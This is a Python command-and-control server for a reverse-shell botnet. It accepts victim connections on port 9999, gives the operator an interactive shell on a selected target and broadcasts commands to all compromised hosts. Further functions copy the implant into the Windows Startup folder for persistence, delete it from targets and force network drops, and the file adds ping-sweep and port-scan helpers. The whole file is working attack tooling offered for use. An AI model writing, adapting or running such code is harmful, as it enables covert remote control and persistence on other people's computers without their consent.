# Made by Rayan Jamous AKA Techysavage.

#-------------- Imports -------------#

import socket
import sys
import os
import threading
import time
import ctypes
from queue import Queue

#Scene
print('  ▄▄▄▄·  ▄· ▄▌    ▄▄▄▄▄▄▄▄ . ▄▄·  ▄ .▄ ▄· ▄▌.▄▄ ·  ▄▄▄·  ▌ ▐· ▄▄▄·  ▄▄ • ▄▄▄ .')
print('  ▐█ ▀█▪▐█▪██▌    •██  ▀▄.▀·▐█ ▌▪██▪▐█▐█▪██▌▐█ ▀. ▐█ ▀█ ▪█·█▌▐█ ▀█ ▐█ ▀ ▪▀▄.▀·')
print('  ▐█▀▀█▄▐█▌▐█▪     ▐█.▪▐▀▀▪▄██ ▄▄██▀▐█▐█▌▐█▪▄▀▀▀█▄▄█▀▀█ ▐█▐█•▄█▀▀█ ▄█ ▀█▄▐▀▀▪▄')
print('  ██▄▪▐█ ▐█▀·.     ▐█▌·▐█▄▄▌▐███▌██▌▐▀ ▐█▀·.▐█▄▪▐█▐█ ▪▐▌ ███ ▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌')
print('  ·▀▀▀▀   ▀ •      ▀▀▀  ▀▀▀ ·▀▀▀ ▀▀▀ ·  ▀ •  ▀▀▀▀  ▀  ▀ . ▀   ▀  ▀ ·▀▀▀▀  ▀▀▀ ')
print('')

time.sleep(3)
os.system('cls')
print("▄▄▌ ▐ ▄▌ ▄▄▄· ▄▄▄▄▄ ▄▄·  ▄ .▄    ·▄▄▄▄         ▄▄ • .▄▄ · ")
print('██· █▌▐█▐█ ▀█ •██  ▐█ ▌▪██▪▐█    ██▪ ██ ▪     ▐█ ▀ ▪▐█ ▀. ')
print('██▪▐█▐▐▌▄█▀▀█  ▐█.▪██ ▄▄██▀▐█    ▐█· ▐█▌ ▄█▀▄ ▄█ ▀█▄▄▀▀▀█▄')
print('▐█▌██▐█▌▐█ ▪▐▌ ▐█▌·▐███▌██▌▐▀    ██. ██ ▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█')
print(' ▀▀▀▀ ▀▪ ▀  ▀  ▀▀▀ ·▀▀▀ ▀▀▀ ·    ▀▀▀▀▀•  ▀█▄▀▪·▀▀▀▀  ▀▀▀▀ ')
print('')


#---------- Tasks ----------#


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_adresses = []

#------------------------------------- Reverse Shell Code -------------------------------------#


def start_reverse_shell():

    #Creates a socket

    def socket_create():
        try:
            global s
            global host
            global port
            host = '0.0.0.0'
            port = 9999
            s = socket.socket()
        except socket.error as msg:
            print("Error: " + str(msg))

    #Binds socket

    def bind():
        try:
            global host
            global s
            global port
            print("Binding Socket To Port " + str(port))
            s.bind((host, port))
            s.listen(5)
        except socket.error as msg:
            print("Socket Binding Error: " + str(msg) + '/n' + "Trying Again...")
            bind()

    #accepts incoming connections

    def connections():
        for c in all_connections:
            c.close()
        del all_connections[:]
        del all_adresses[:]
        while 1:
            try:
                conn, address = s.accept()
                conn.setblocking(1)
                all_connections.append(conn)
                all_adresses.append(address)
                print("\nConnection has been established: " + address[0], socket.getfqdn(address[0]))
            except:
                print("Error accepting connections")

    #BotNet basically. Allows you to send commands to all the clients at once.

    def broadcast():
        while True:
            cmd = input('Enter command > ')
            if cmd == "q" or cmd == 'quit':
                break
            for i in range(0, len(all_adresses)):                         
                conn = all_connections[i]
                conn.send(str.encode(cmd))
                print("Sending command to", all_connections[i])
            conn.close()
        


    def autorun():
        ask = input("Are you sure you want to change the shells directory? ")
        for i in range(0, len(all_adresses)): 
            conn = all_connections[i]
            if ask == "yes" or ask == "y":
                try:
                    user = os.getlogin()
                    path = 'move command.py C:\\Users\\'+ str(user) +'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
                    conn.send(str.encode(path))
                    print('Moved shell to', 'C:\\Users\\'+ str(user) +'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                except:
                    print('Error')



    def terminate():
        print('Terminate command deletes your shell program off the targets device. /n You will enter the number of the target and will be prompted to confirm your removal of that device.')
        ipaddr = int(input('Enter the number of the target device you want to remove: '))
        confirm = input('You selected {}, are you sure you want to remove this device? (yes/no) > '.format(all_adresses[ipaddr]))
        if confirm == 'yes' or confirm == 'y':
            print('Removing shell of device', all_adresses[ipaddr])
            conn = all_connections[ipaddr]
            try:
                conn.send(str.encode('del client.exe'))
                print('Done...')
                conn.close()
            except:
                print('Done...')
                conn.close()


    def close_connection():
        print("This program will terminate the connection of a target's device. This will not delete it permanently but only until the client reconnects.")
        ipaddr = int(input("Enter the number of the target's device connection you want to terminate: "))
        confirm = input('You selected {}, are you sure you want to close this connection to this device? (yes/no) > '.format(all_adresses[ipaddr]))
        if confirm == 'yes' or confirm == 'y':
            print('Closing Connection to', all_adresses[ipaddr])
            conn = all_connections[ipaddr]
            try:
                conn.send(str.encode('ipconfig/release && ipconfig/renew'))
                print('Complete...')
                conn.close()
            except:
                print('Done...')
                conn.close()


    #starts command center

    def start_shell():
        while True:
            cmd = input('Shell > ')
            if cmd == 'quit':
                command_center()
            if cmd == 'broadcast':
                broadcast()
            if cmd == 'sessions':
                sessions()
            if cmd == 'terminate':
                terminate()
            if cmd == 'close connection' or cmd == 'kill connection' or cmd == 'terminate connection':
                close_connection()
            if cmd == 'autorun':
                autorun()
            elif 'select' in cmd:
                conn = select_target(cmd)
                if conn is not None:
                    target_commands(conn)
                else:
                    print("Command not recgonized")

    #lists connections

    def sessions():
        results = ''
        for i, conn in enumerate(all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del all_connections[i]
                del all_adresses[i]
                continue
            results += str(i) + "   " + str(all_adresses[i][0]) + "   " + str(all_adresses[i][1]) + "   " + str(socket.getfqdn(all_adresses[i][0])) +'\n'
            print('----------- CLients ------------' + '\n' + results)




    #Selects targets

    def select_target(cmd):
        try:
            target = cmd.replace('select ', '')
            target = int(target)
            conn = all_connections[target]
            print("You are now connected to  " + str(all_adresses[target][0]))
            print("root@" + str(all_adresses[target][0]) + '> ', end="")
            return conn
        except:
            print('Invalid Target!')
            return None


    #Sends commands

    def target_commands(conn):
        while True:
            try:
                cmd = input()
                if cmd == 'q':
                    break
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")
            except:
                print('Connection was lost')
                break




    #Creates proccesses

    def create_workers():
        for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target=work)
            t.daemon = True
            t.start()

    #jobs for threads

    def work():
        while True:
            x = queue.get()
            if x == 1:
                socket_create()
                bind()
                connections()
            if x == 2:
                start_shell()
            queue.task_done()
    #creates the job

    def create_jobs():
        for x in JOB_NUMBER:
            queue.put(x)
        queue.join()


    create_workers()
    create_jobs()


#------------------------ Command Center ----------------------------# 

#Help guide

def helps():
    print("")
    print("--------- Options ---------")
    print('[0] Start Server ')
    print('[1] Scan Network ')
    print('[2] Scan IP ')
    print('[3] Scan Port ')
    print('[4] Quick Scan ')
    print("[5] Get Info")
    print('')



#Scans network for online ip addresses

def scan_network():
    print('Starting Network Scan...')
    for num in range(1, 200):
        ip = "192.168.2." + str(num)
        exit_code = os.system("ping -n 1 -w 1 " + ip + " > nul") # Windows
        if exit_code == 0:
            hostname = socket.getfqdn(ip)
            if hostname == ip:
                hostname = ""
            print(ip,  "ONLINE ", hostname)
    print("Network scan has been complete!")

def port_scan():
    print('Starting Port Scan...')

    tgtHost = input("Enter an ip > ")
    tgtPort = int(input("Enter port to scan > "))

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect_ex((tgtHost, tgtPort))
        print('[+] %d/tcp Open' % tgtPort)
    except:
        print('[-] %d/tcp Closed' % tgtPort)
    finally:
        s.close()

#Scans network at a faster rate but without getting hostname

def quick_scan():
    print('Starting Quick Scan...')
    for num in range(1, 255):
        ip = "192.168.2." + str(num)
        code = os.system("ping -n 1 -w 1 " + str(ip) + " > nul") # Windows
        if code == 0:
            print(ip,  "ONLINE ")
    print("Network scan has been complete!")


#Checks to see if ip address is active

def scan_ip():
    print('Starting Scan IP...')
    ip = input("Enter IP: ")
    check = os.system('ping -n 1 -w 1 ' + str(ip) + '> nul')
    if check == 0:
        print('[+]', ip, "is online!")
    else:
        print('[-]', ip, 'is offline!')

def get_info():
    ip = input('Enter ip or host > ')
    domain = socket.gethostbyname(ip)
    host = socket.getfqdn(ip)
    print("Info: ", str(domain), " Host: ", str(host), " IP: ", str(ip))
    print('-------- Complete --------')

def command_center():
    while True:
        cmd = input('Command Center > ')

        if cmd == 'start server' or cmd == '0':
            start_reverse_shell()
        if cmd == 'help':
            helps()
        if cmd == 'scan network' or cmd == '1':
            scan_network()
        if cmd == 'scan ip' or cmd == '2':
            scan_ip()
        if cmd == 'scan port' or cmd == '3':
            port_scan()
        if cmd == 'quick scan' or cmd == '4':
            quick_scan()
        if cmd == 'get info' or cmd == '5':
            get_info()

def main():
    helps()
    command_center()

if __name__ == '__main__':
    main()
